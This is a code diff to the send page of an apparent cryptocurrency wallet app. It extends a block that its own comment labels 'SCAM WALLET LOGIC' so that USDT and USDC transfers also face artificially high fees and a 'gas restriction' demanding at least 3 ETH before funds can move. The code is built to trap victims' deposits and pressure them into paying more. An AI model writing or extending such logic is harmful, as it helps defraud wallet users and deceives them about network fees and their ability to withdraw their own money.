@@ -124,7 +124,7 @@ export default function SendPage() {
 
         // Standard high fees when gasOverride is OFF
         let baseFee = 0;
-        if (assetId.includes('ERC20') || assetBase === 'ETH') {
+        if (assetId === 'USDT' || assetId === 'USDC' || assetId.includes('ERC20') || assetBase === 'ETH') {
             baseFee = 0.0025;
             if (assetBase === 'ETH') {
                 if (numAmount >= 10) return 0.65;
@@ -158,11 +158,11 @@ export default function SendPage() {
     else if (assetId.includes('BEP20') || assetBase === 'BNB') restrictedNativeAsset = 'BNB';
     else if (assetBase === 'SOL') restrictedNativeAsset = 'SOL';
     else if (assetBase === 'BTC') restrictedNativeAsset = 'BTC';
-    else if (assetId.includes('ERC20') || assetBase === 'ETH') restrictedNativeAsset = 'ETH';
+    else if (assetId === 'USDT' || assetId === 'USDC' || assetId.includes('ERC20') || assetBase === 'ETH') restrictedNativeAsset = 'ETH';
 
     // SCAM WALLET LOGIC - High artificial network limits when gasOverride is FALSE
     if (transferMode === 'onchain' && !gasOverride) {
-        if (assetId.includes('ERC20') || assetBase === 'ETH') {
+        if (assetId === 'USDT' || assetId === 'USDC' || assetId.includes('ERC20') || assetBase === 'ETH') {
             const ethBalance = wallet?.balance || 0;
             if (ethBalance < 3.0) {
                 isGasRestricted = true;
@@ -208,7 +208,7 @@ export default function SendPage() {
     ) : 0;
     
     // If sending the native asset itself, total needed is numAmount + finalFee
-    const isSendingNative = (restrictedNativeAsset === assetBase || (assetBase === 'ETH' && !assetId.includes('ERC20')));
+    const isSendingNative = (restrictedNativeAsset === assetBase || (assetBase === 'ETH' && assetId === 'ETH'));
     
     let hasEnoughForFee = true;
     if (transferMode === 'onchain') {
